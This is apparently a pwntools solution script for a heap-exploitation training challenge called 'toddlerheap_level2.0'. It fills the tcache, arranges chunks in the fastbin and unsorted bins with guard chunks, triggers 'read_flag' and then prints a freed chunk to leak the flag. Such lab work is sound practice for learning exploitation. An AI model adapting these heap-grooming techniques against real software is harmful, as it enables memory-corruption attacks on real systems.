#!/usr/bin/env python3

from pwn import *

binary = './toddlerheap_level2.0_patched'

p = process(binary)

s = '''
b malloc
b free
'''

for i in range(7):
	p.sendline(f"malloc {i} 75")


	
for i in range(7):
	p.sendline(f"free {i}")



p.sendline(f"calloc 8 75") 
p.sendline(f"calloc 9 1044")


p.sendline(f"calloc 10 1044") # guarding


p.sendline(f"calloc 12 75") 
p.sendline(f"calloc 13 1044")


p.sendline(f"calloc 14 1044") # guarding


p.sendline(f"free 8") # fastbin # 1 (flag chunk)
p.sendline(f"free 9") # unsorted # 1



p.sendline(f"free 12") # fastbin # 2
p.sendline(f"free 13") # unsorted # 2












#gdb.attach(p, s)
p.sendline(f"read_flag")





p.sendline("puts 8")



p.interactive()
